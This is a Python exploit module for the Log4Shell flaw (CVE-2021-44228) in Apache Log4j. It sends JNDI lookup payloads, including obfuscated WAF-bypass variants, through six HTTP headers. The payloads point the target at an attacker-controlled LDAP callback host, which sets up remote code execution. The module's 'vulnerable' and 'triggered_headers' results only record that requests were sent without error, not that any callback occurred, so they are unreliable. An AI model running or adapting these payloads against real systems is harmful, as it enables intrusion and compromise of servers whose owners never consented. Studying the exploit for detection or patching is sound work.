"""CVE-2021-44228 — Log4Shell Remote Code Execution.

Exploits the JNDI injection flaw in Apache Log4j 2.x (< 2.17.0) by sending
crafted payloads across multiple HTTP headers with optional WAF-bypass
obfuscation variants.
"""

from __future__ import annotations

import requests

# Headers commonly logged by Java applications and processed by Log4j
_INJECTION_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "X-Api-Version",
    "Referer",
    "Accept-Language",
    "Authorization",
]

# Payload variants — %s is replaced with the callback host
_PAYLOAD_VARIANTS = [
    "${jndi:ldap://%s/a}",
    "${${lower:j}ndi:${lower:l}dap://%s/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s/a}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//%s/a}",
]


def exploit(
    target: str,
    callback_host: str,
    *,
    use_obfuscation: bool = True,
    timeout: int = 10,
) -> dict:
    """Send Log4Shell payloads to *target* across multiple headers.

    Parameters
    ----------
    target:
        URL of the target application.
    callback_host:
        Attacker-controlled LDAP/RMI callback (e.g. ``"attacker:1389"``).
    use_obfuscation:
        If ``True``, sends all ``_PAYLOAD_VARIANTS``; otherwise only the
        first (plain) variant.
    timeout:
        HTTP request timeout in seconds.

    Returns
    -------
    dict with ``cve``, ``vulnerable``, ``payloads_sent``,
    ``triggered_headers``, ``errors``.
    """
    variants = _PAYLOAD_VARIANTS if use_obfuscation else _PAYLOAD_VARIANTS[:1]
    payloads_sent = 0
    triggered_headers: list[str] = []
    errors: list[str] = []

    for header in _INJECTION_HEADERS:
        for variant in variants:
            payload = variant % callback_host
            try:
                requests.get(
                    target,
                    headers={header: payload},
                    timeout=timeout,
                )
                payloads_sent += 1
                if header not in triggered_headers:
                    triggered_headers.append(header)
            except requests.RequestException as exc:
                errors.append(f"{header}: {exc}")

    return {
        "cve": "CVE-2021-44228",
        "vulnerable": payloads_sent > 0 and len(errors) == 0,
        "payloads_sent": payloads_sent,
        "triggered_headers": triggered_headers,
        "errors": errors,
    }
